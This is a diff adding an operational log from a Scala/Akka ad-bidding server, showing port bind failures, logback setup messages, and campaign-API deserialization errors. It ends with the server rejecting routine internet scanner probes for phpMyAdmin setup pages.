@@ -1,0 +1,582 @@
+[0m[[0minfo[0m] [0mLoading project definition from /root/dummy-responser/project[0m
+[0m[[0minfo[0m] [0mLoading project definition from /root/dummy-responser/project[0m
+[0m[[0minfo[0m] [0mSet current project to dummy-responser (in build file:/root/dummy-responser/)[0m
+[0m[[0minfo[0m] [0mSet current project to dummy-responser (in build file:/root/dummy-responser/)[0m
+[0m[[0minfo[0m] [0mRunning DummyBidder [0m
+[0m[[0minfo[0m] [0mRunning DummyBidder [0m
+[INFO] [08/16/2016 13:22:55.210] [my-system-akka.actor.default-dispatcher-2] [akka://my-system/user/IO-HTTP/listener-0] Bound to /0.0.0.0:8090
+[WARN] [08/16/2016 13:22:55.293] [my-system-akka.actor.default-dispatcher-2] [akka://my-system/user/IO-HTTP/listener-0] Bind to /0.0.0.0:8090 failed
+[ERROR] [08/16/2016 13:22:55.293] [my-system-akka.actor.default-dispatcher-4] [akka://my-system/system/IO-TCP/selectors/$a/0] Bind failed for TCP channel on endpoint [/0.0.0.0:8090]
+java.net.BindException: Address already in use
+	at sun.nio.ch.Net.bind0(Native Method)
+	at sun.nio.ch.Net.bind(Net.java:433)
+	at sun.nio.ch.Net.bind(Net.java:425)
+	at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:223)
+	at sun.nio.ch.ServerSocketAdaptor.bind(ServerSocketAdaptor.java:74)
+	at akka.io.TcpListener.liftedTree1$1(TcpListener.scala:53)
+	at akka.io.TcpListener.<init>(TcpListener.scala:50)
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
+	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
+	at akka.util.Reflect$.instantiate(Reflect.scala:66)
+	at akka.actor.ArgsReflectConstructor.produce(Props.scala:355)
+	at akka.actor.Props.newActor(Props.scala:255)
+	at akka.actor.ActorCell.newActor(ActorCell.scala:552)
+	at akka.actor.ActorCell.create(ActorCell.scala:578)
+	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:456)
+	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:478)
+	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:263)
+	at akka.dispatch.Mailbox.run(Mailbox.scala:219)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+
+12:02:26,681 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Could NOT find resource [logback.groovy]
+12:02:26,681 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Could NOT find resource [logback-test.xml]
+12:02:26,681 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Found resource [logback.xml] at [jar:file:/usr/share/verta-bidder/lib/default.verta-bidder-0.1-SNAPSHOT.jar!/logback.xml]
+12:02:26,688 |-INFO in ch.qos.logback.core.joran.spi.ConfigurationWatchList@26159e3b - URL [jar:file:/usr/share/verta-bidder/lib/default.verta-bidder-0.1-SNAPSHOT.jar!/logback.xml] is not of type file
+12:02:26,712 |-INFO in ch.qos.logback.classic.joran.action.ConfigurationAction - debug attribute not set
+12:02:26,714 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.ConsoleAppender]
+12:02:26,717 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [STDOUT]
+12:02:26,731 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:02:26,745 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.rolling.RollingFileAppender]
+12:02:26,746 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [FILE]
+12:02:26,750 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:02:26,754 |-INFO in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@6d22228 - No compression will be used
+12:02:26,755 |-WARN in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@6d22228 - Large window sizes are not allowed.
+12:02:26,755 |-WARN in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@6d22228 - MaxIndex reduced to 20
+12:02:26,757 |-INFO in ch.qos.logback.core.rolling.RollingFileAppender[FILE] - Active log file name: bidder.log
+12:02:26,758 |-INFO in ch.qos.logback.core.rolling.RollingFileAppender[FILE] - File property is set to [bidder.log]
+12:02:26,758 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.rolling.RollingFileAppender]
+12:02:26,758 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [DEBUG-FILE]
+12:02:26,758 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:02:26,759 |-INFO in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@810695d - No compression will be used
+12:02:26,759 |-WARN in ch.qos.logback.core.rolling.RollingFileAppender[DEBUG-FILE] - No TriggeringPolicy was set for the RollingFileAppender named DEBUG-FILE
+12:02:26,759 |-WARN in ch.qos.logback.core.rolling.RollingFileAppender[DEBUG-FILE] - For more information, please visit http://logback.qos.ch/codes.html#rfa_no_tp
+12:02:26,759 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [net.logstash.logback.appender.LogstashTcpSocketAppender]
+12:02:26,764 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [STASH]
+12:02:26,856 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.LoggingEventJsonProviders] for [providers] property
+12:02:26,862 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.LoggingEventFormattedTimestampJsonProvider] for [timestamp] property
+12:02:26,869 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.MessageJsonProvider] for [message] property
+12:02:26,870 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.ArgumentsJsonProvider] for [arguments] property
+12:02:26,884 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting level of logger [com.verta] to INFO
+12:02:26,884 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting additivity of logger [com.verta] to false
+12:02:26,884 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [FILE] to Logger[com.verta]
+12:02:26,884 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting level of logger [integration-debug] to DEBUG
+12:02:26,884 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting additivity of logger [integration-debug] to false
+12:02:26,884 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [STASH] to Logger[integration-debug]
+12:02:26,884 |-INFO in ch.qos.logback.classic.joran.action.RootLoggerAction - Setting level of ROOT logger to INFO
+12:02:26,884 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [STDOUT] to Logger[ROOT]
+12:02:26,884 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [FILE] to Logger[ROOT]
+12:02:26,885 |-ERROR in ch.qos.logback.core.joran.action.ShutdownHookAction - Missing class name for shutdown hook. Near [shutdownHook] line 66
+12:02:26,885 |-INFO in ch.qos.logback.classic.joran.action.ConfigurationAction - End of configuration.
+12:02:26,885 |-INFO in ch.qos.logback.classic.joran.JoranConfigurator@16e754e1 - Registering current configuration as safe fallback point
+
+[INFO] [2016-08-22 12:02:26,888] [rtb-server-akka.actor.default-dispatcher-4] a.e.s.Slf4jLogger: Slf4jLogger started
+[WARN] [2016-08-22 12:02:29,028] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpListener: Bind to /0.0.0.0:8080 failed
+[ERROR] [2016-08-22 12:02:29,029] [rtb-server-akka.actor.default-dispatcher-4] a.i.TcpListener: Bind failed for TCP channel on endpoint [/0.0.0.0:8080]
+java.net.BindException: Address already in use
+	at sun.nio.ch.Net.bind0(Native Method)
+	at sun.nio.ch.Net.bind(Net.java:433)
+	at sun.nio.ch.Net.bind(Net.java:425)
+	at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:223)
+	at sun.nio.ch.ServerSocketAdaptor.bind(ServerSocketAdaptor.java:74)
+	at akka.io.TcpListener.liftedTree1$1(TcpListener.scala:53)
+	at akka.io.TcpListener.<init>(TcpListener.scala:50)
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
+	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
+	at akka.util.Reflect$.instantiate(Reflect.scala:66)
+	at akka.actor.ArgsReflectConstructor.produce(Props.scala:355)
+	at akka.actor.Props.newActor(Props.scala:255)
+	at akka.actor.ActorCell.newActor(ActorCell.scala:552)
+	at akka.actor.ActorCell.create(ActorCell.scala:578)
+	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:456)
+	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:478)
+	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:263)
+	at akka.dispatch.Mailbox.run(Mailbox.scala:219)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+12:03:44,697 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Could NOT find resource [logback.groovy]
+12:03:44,697 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Could NOT find resource [logback-test.xml]
+12:03:44,697 |-INFO in ch.qos.logback.classic.LoggerContext[default] - Found resource [logback.xml] at [jar:file:/usr/share/verta-bidder/lib/default.verta-bidder-0.1-SNAPSHOT.jar!/logback.xml]
+12:03:44,703 |-INFO in ch.qos.logback.core.joran.spi.ConfigurationWatchList@a37afeb - URL [jar:file:/usr/share/verta-bidder/lib/default.verta-bidder-0.1-SNAPSHOT.jar!/logback.xml] is not of type file
+12:03:44,725 |-INFO in ch.qos.logback.classic.joran.action.ConfigurationAction - debug attribute not set
+12:03:44,728 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.ConsoleAppender]
+12:03:44,731 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [STDOUT]
+12:03:44,743 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:03:44,758 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.rolling.RollingFileAppender]
+12:03:44,759 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [FILE]
+12:03:44,761 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:03:44,766 |-INFO in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@10c73f75 - No compression will be used
+12:03:44,766 |-WARN in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@10c73f75 - Large window sizes are not allowed.
+12:03:44,766 |-WARN in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@10c73f75 - MaxIndex reduced to 20
+12:03:44,769 |-INFO in ch.qos.logback.core.rolling.RollingFileAppender[FILE] - Active log file name: bidder.log
+12:03:44,769 |-INFO in ch.qos.logback.core.rolling.RollingFileAppender[FILE] - File property is set to [bidder.log]
+12:03:44,770 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [ch.qos.logback.core.rolling.RollingFileAppender]
+12:03:44,770 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [DEBUG-FILE]
+12:03:44,770 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] for [encoder] property
+12:03:44,771 |-INFO in ch.qos.logback.core.rolling.FixedWindowRollingPolicy@24eebf5b - No compression will be used
+12:03:44,771 |-WARN in ch.qos.logback.core.rolling.RollingFileAppender[DEBUG-FILE] - No TriggeringPolicy was set for the RollingFileAppender named DEBUG-FILE
+12:03:44,771 |-WARN in ch.qos.logback.core.rolling.RollingFileAppender[DEBUG-FILE] - For more information, please visit http://logback.qos.ch/codes.html#rfa_no_tp
+12:03:44,771 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - About to instantiate appender of type [net.logstash.logback.appender.LogstashTcpSocketAppender]
+12:03:44,775 |-INFO in ch.qos.logback.core.joran.action.AppenderAction - Naming appender as [STASH]
+12:03:44,865 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.LoggingEventJsonProviders] for [providers] property
+12:03:44,871 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.LoggingEventFormattedTimestampJsonProvider] for [timestamp] property
+12:03:44,879 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.MessageJsonProvider] for [message] property
+12:03:44,880 |-INFO in ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming default type [net.logstash.logback.composite.loggingevent.ArgumentsJsonProvider] for [arguments] property
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting level of logger [com.verta] to INFO
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting additivity of logger [com.verta] to false
+12:03:44,894 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [FILE] to Logger[com.verta]
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting level of logger [integration-debug] to DEBUG
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.LoggerAction - Setting additivity of logger [integration-debug] to false
+12:03:44,894 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [STASH] to Logger[integration-debug]
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.RootLoggerAction - Setting level of ROOT logger to INFO
+12:03:44,894 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [STDOUT] to Logger[ROOT]
+12:03:44,894 |-INFO in ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [FILE] to Logger[ROOT]
+12:03:44,894 |-ERROR in ch.qos.logback.core.joran.action.ShutdownHookAction - Missing class name for shutdown hook. Near [shutdownHook] line 66
+12:03:44,894 |-INFO in ch.qos.logback.classic.joran.action.ConfigurationAction - End of configuration.
+12:03:44,895 |-INFO in ch.qos.logback.classic.joran.JoranConfigurator@33435f45 - Registering current configuration as safe fallback point
+
+[INFO] [2016-08-22 12:03:44,898] [rtb-server-akka.actor.default-dispatcher-4] a.e.s.Slf4jLogger: Slf4jLogger started
+[INFO] [2016-08-22 12:03:46,990] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpListener: Bound to /0.0.0.0:8080
+[WARN] [2016-08-22 12:32:28,611] [rtb-server-akka.actor.default-dispatcher-18] s.c.c.HttpClientConnection: GET request to '/api/rtb/videocampaigns?expand=countries&limit=50' timed out after 1500 milliseconds, closing connection
+[WARN] [2016-08-22 12:32:28,612] [rtb-server-akka.actor.default-dispatcher-16] s.c.c.HttpHostConnectionSlot: GET request to /api/rtb/videocampaigns?expand=countries&limit=50 timed out in response to GET request to /api/rtb/videocampaigns?expand=countries&limit=50 with no retries left, dispatching error...
+[ERROR] [2016-08-22 12:32:28,615] [rtb-server-akka.actor.default-dispatcher-2] a.a.OneForOneStrategy: Object expected in field 'total'
+spray.json.DeserializationException: Object expected in field 'total'
+	at spray.json.package$.deserializationError(package.scala:23)
+	at spray.json.ProductFormats$class.fromField(ProductFormats.scala:64)
+	at com.verta.mapping.protocol.system.rtb.server.SyncServiceJsonProtocol$.fromField(JsonProtocol.scala:109)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:78)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:68)
+	at spray.json.JsValue.convertTo(JsValue.scala:31)
+	at com.verta.mapping.Converter.toCampaignsWrapper(Converter.scala:60)
+	at com.verta.service.BackendConfigurationService.getCampaigns(BackendConfigurationService.scala:28)
+	at com.verta.system.BidderConnectionManager$$anonfun$started$1.applyOrElse(BidderConnectionManager.scala:64)
+	at akka.actor.Actor$class.aroundReceive(Actor.scala:467)
+	at com.verta.system.BidderConnectionManager.aroundReceive(BidderConnectionManager.scala:31)
+	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516)
+	at akka.actor.ActorCell.invoke(ActorCell.scala:487)
+	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238)
+	at akka.dispatch.Mailbox.run(Mailbox.scala:220)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+[WARN] [2016-08-22 12:32:28,671] [rtb-server-akka.actor.default-dispatcher-11] s.c.c.HttpClientConnection: GET request to '/api/rtb/videocampaigns?expand=countries&limit=50' timed out after 1500 milliseconds, closing connection
+[WARN] [2016-08-22 12:32:28,672] [rtb-server-akka.actor.default-dispatcher-11] s.c.c.HttpHostConnectionSlot: GET request to /api/rtb/videocampaigns?expand=countries&limit=50 timed out in response to GET request to /api/rtb/videocampaigns?expand=countries&limit=50 with no retries left, dispatching error...
+[ERROR] [2016-08-22 12:32:28,672] [rtb-server-akka.actor.default-dispatcher-11] a.d.TaskInvocation: Object expected in field 'total'
+spray.json.DeserializationException: Object expected in field 'total'
+	at spray.json.package$.deserializationError(package.scala:23)
+	at spray.json.ProductFormats$class.fromField(ProductFormats.scala:64)
+	at com.verta.mapping.protocol.system.rtb.server.SyncServiceJsonProtocol$.fromField(JsonProtocol.scala:109)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:78)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:68)
+	at spray.json.JsValue.convertTo(JsValue.scala:31)
+	at com.verta.mapping.Converter.toCampaignsWrapper(Converter.scala:60)
+	at com.verta.service.BackendConfigurationService.getCampaigns(BackendConfigurationService.scala:28)
+	at com.verta.system.TaskScheduler$$anonfun$receive$1$$anonfun$applyOrElse$2.apply$mcV$sp(TaskScheduler.scala:36)
+	at akka.actor.Scheduler$$anon$5.run(Scheduler.scala:79)
+	at akka.actor.LightArrayRevolverScheduler$$anon$2$$anon$1.run(Scheduler.scala:242)
+	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+[WARN] [2016-08-22 12:51:16,613] [rtb-server-akka.actor.default-dispatcher-3] s.c.c.HttpClientConnection: GET request to '/api/rtb/videocampaigns?expand=countries&limit=50' timed out after 1500 milliseconds, closing connection
+[WARN] [2016-08-22 12:51:16,613] [rtb-server-akka.actor.default-dispatcher-3] s.c.c.HttpHostConnectionSlot: GET request to /api/rtb/videocampaigns?expand=countries&limit=50 timed out in response to GET request to /api/rtb/videocampaigns?expand=countries&limit=50 with no retries left, dispatching error...
+[ERROR] [2016-08-22 12:51:16,616] [rtb-server-akka.actor.default-dispatcher-26] a.a.OneForOneStrategy: Object expected in field 'total'
+spray.json.DeserializationException: Object expected in field 'total'
+	at spray.json.package$.deserializationError(package.scala:23)
+	at spray.json.ProductFormats$class.fromField(ProductFormats.scala:64)
+	at com.verta.mapping.protocol.system.rtb.server.SyncServiceJsonProtocol$.fromField(JsonProtocol.scala:109)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:78)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:68)
+	at spray.json.JsValue.convertTo(JsValue.scala:31)
+	at com.verta.mapping.Converter.toCampaignsWrapper(Converter.scala:60)
+	at com.verta.service.BackendConfigurationService.getCampaigns(BackendConfigurationService.scala:28)
+	at com.verta.system.BidderConnectionManager$$anonfun$started$1.applyOrElse(BidderConnectionManager.scala:64)
+	at akka.actor.Actor$class.aroundReceive(Actor.scala:467)
+	at com.verta.system.BidderConnectionManager.aroundReceive(BidderConnectionManager.scala:31)
+	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516)
+	at akka.actor.ActorCell.invoke(ActorCell.scala:487)
+	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238)
+	at akka.dispatch.Mailbox.run(Mailbox.scala:220)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+[INFO] [2016-08-22 15:22:46,477] [rtb-server-akka.actor.default-dispatcher-21] a.a.LocalActorRef: Message [akka.io.SelectionHandler$ChannelReadable$] from Actor[akka://rtb-server/deadLetters] to Actor[akka://rtb-server/system/IO-TCP/selectors/$a/113#937003634] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.
+[INFO] [2016-08-22 15:44:46,448] [rtb-server-akka.actor.default-dispatcher-25] a.a.LocalActorRef: Message [akka.io.SelectionHandler$ChannelReadable$] from Actor[akka://rtb-server/deadLetters] to Actor[akka://rtb-server/system/IO-TCP/selectors/$a/114#1638011477] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.
+[WARN] [2016-08-23 01:38:46,672] [rtb-server-akka.actor.default-dispatcher-26] s.c.c.HttpClientConnection: GET request to '/api/rtb/videocampaigns?expand=countries&limit=50' timed out after 1500 milliseconds, closing connection
+[WARN] [2016-08-23 01:38:46,672] [rtb-server-akka.actor.default-dispatcher-26] s.c.c.HttpHostConnectionSlot: GET request to /api/rtb/videocampaigns?expand=countries&limit=50 timed out in response to GET request to /api/rtb/videocampaigns?expand=countries&limit=50 with no retries left, dispatching error...
+[ERROR] [2016-08-23 01:38:46,673] [rtb-server-akka.actor.default-dispatcher-18] a.d.TaskInvocation: Object expected in field 'total'
+spray.json.DeserializationException: Object expected in field 'total'
+	at spray.json.package$.deserializationError(package.scala:23)
+	at spray.json.ProductFormats$class.fromField(ProductFormats.scala:64)
+	at com.verta.mapping.protocol.system.rtb.server.SyncServiceJsonProtocol$.fromField(JsonProtocol.scala:109)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:78)
+	at spray.json.ProductFormatsInstances$$anon$3.read(ProductFormatsInstances.scala:68)
+	at spray.json.JsValue.convertTo(JsValue.scala:31)
+	at com.verta.mapping.Converter.toCampaignsWrapper(Converter.scala:60)
+	at com.verta.service.BackendConfigurationService.getCampaigns(BackendConfigurationService.scala:28)
+	at com.verta.system.TaskScheduler$$anonfun$receive$1$$anonfun$applyOrElse$2.apply$mcV$sp(TaskScheduler.scala:36)
+	at akka.actor.Scheduler$$anon$5.run(Scheduler.scala:79)
+	at akka.actor.LightArrayRevolverScheduler$$anon$2$$anon$1.run(Scheduler.scala:242)
+	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)
+	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397)
+	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)
+	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)
+	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)
+	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)
+[WARN] [2016-08-23 03:04:30,320] [rtb-server-akka.actor.default-dispatcher-23] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/myadmin/scripts/setup.php,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-23 21:40:40,601] [rtb-server-akka.actor.default-dispatcher-22] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/pma/scripts/setup.php,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-24 13:24:32,903] [rtb-server-akka.actor.default-dispatcher-23] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-08-24 16:11:21,743] [rtb-server-akka.actor.default-dispatcher-15] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/phpmyadmin/scripts/setup.php,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-24 16:53:49,431] [rtb-server-akka.actor.default-dispatcher-23] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: 
+[WARN] [2016-08-25 10:52:55,565] [rtb-server-akka.actor.default-dispatcher-3] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/mysql/scripts/setup.php,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-25 11:41:03,801] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: 
+[WARN] [2016-08-26 01:51:16,369] [rtb-server-akka.actor.default-dispatcher-16] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: " ?e
+[WARN] [2016-08-26 12:14:02,571] [rtb-server-akka.actor.default-dispatcher-24] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-26 20:41:57,269] [rtb-server-akka.actor.default-dispatcher-22] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-27 18:58:40,344] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/admin,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-29 06:20:22,549] [rtb-server-akka.actor.default-dispatcher-24] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
